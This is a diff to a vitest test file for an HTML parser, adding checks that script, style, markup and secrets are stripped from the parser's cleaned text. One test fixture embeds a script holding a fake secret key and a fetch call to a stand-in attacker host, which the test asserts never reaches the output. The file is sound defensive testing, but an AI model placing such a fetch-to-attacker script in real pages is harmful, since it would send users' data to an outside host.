@@ -2,6 +2,7 @@ import type { ParsedUnit } from "@oscharko-dev/keiko-contracts";
 import { describe, expect, it } from "vitest";
 
 import { htmlParser } from "./html-parser.js";
+import type { InternalParserResult } from "./types.js";
 import {
   HTML_DANGEROUS,
   HTML_HEADINGS,
@@ -48,12 +49,14 @@ describe("htmlParser", () => {
     expect(paths).toEqual([["Top"], ["Top", "Sub"], ["Top", "Sub", "Deeper"]]);
   });
 
-  it("DROPS <script> contents entirely — no JS leaks into any unit", () => {
+  it("DROPS <script>/<style> contents entirely — no JS leaks into any unit (GRD-003)", () => {
     const result = htmlParser.parse(
       selectionFromText(HTML_DANGEROUS, { extension: "html" }),
       buildParserOptions({ now: () => 0 }),
     );
-    const text = HTML_DANGEROUS;
+    // GRD-003: unit spans now index the cleaned `normalizedText` projection, so slice from
+    // THERE (the persisted text + LLM excerpt), not the raw HTML.
+    const text = (result as InternalParserResult).normalizedText ?? "";
     for (const unit of result.units) {
       const block = asBlock(unit);
       const span = text.slice(block.span.start, block.span.end);
@@ -61,6 +64,12 @@ describe("htmlParser", () => {
       expect(span).not.toContain("display:none");
       expect(span).not.toContain("fallback");
     }
+    // The whole persisted projection must be free of script/style/markup.
+    expect(text).not.toContain("alert(");
+    expect(text).not.toContain("display:none");
+    expect(text).not.toContain("<script");
+    expect(text).not.toContain("<style");
+    expect(/<[a-z!/]/i.test(text)).toBe(false);
   });
 
   it("never executes embedded JavaScript (defence-in-depth: the parser path is pure)", () => {
@@ -133,10 +142,12 @@ describe("htmlParser", () => {
       selectionFromText(html, { extension: "html" }),
       buildParserOptions({ now: () => 0 }),
     );
+    const text = (result as InternalParserResult).normalizedText ?? "";
     for (const unit of result.units) {
       const block = asBlock(unit);
-      expect(html.slice(block.span.start, block.span.end)).not.toContain("unterminated");
+      expect(text.slice(block.span.start, block.span.end)).not.toContain("unterminated");
     }
+    expect(text).not.toContain("unterminated");
   });
 
   it("respects the heading stack — H2 then H1 resets the path", () => {
@@ -169,5 +180,36 @@ describe("htmlParser", () => {
       buildParserOptions({ now: () => start }),
     );
     expect(Date.now() - start).toBeLessThan(500);
+  });
+});
+
+describe("htmlParser — cleaned normalizedText (GRD-003)", () => {
+  it("emits a tag/script/style/secret-free normalizedText while preserving visible facts", () => {
+    const html =
+      "<!doctype html><html><head><title>Policy</title>" +
+      '<script>const S="sk-should-never-appear-9988";fetch("http://attacker.example/x");</script>' +
+      "<style>.x{color:red}</style></head><body>" +
+      "<h1>Credit Policy</h1><p>The Tier-2 overdraft limit is 250,000 EUR.</p>" +
+      "<p>Contact <a href='mailto:ops@example.com'>ops</a> for details.</p></body></html>";
+    const result = htmlParser.parse(
+      selectionFromText(html, { extension: "html" }),
+      buildParserOptions({ now: () => 0 }),
+    );
+    const text = (result as InternalParserResult).normalizedText ?? "";
+    expect(text).toContain("250,000 EUR");
+    expect(text).toContain("Contact ops for details");
+    expect(text).not.toContain("sk-should-never-appear-9988");
+    expect(text).not.toContain("attacker.example");
+    expect(text).not.toContain("<script");
+    expect(text).not.toContain("<style");
+    expect(text).not.toContain("<a");
+    expect(text).not.toContain("color:red");
+    // Every unit span must slice cleanly out of the projection.
+    for (const unit of result.units) {
+      const block = asBlock(unit);
+      const span = text.slice(block.span.start, block.span.end);
+      expect(span.length).toBe(block.span.end - block.span.start);
+      expect(span).not.toContain("<");
+    }
   });
 });
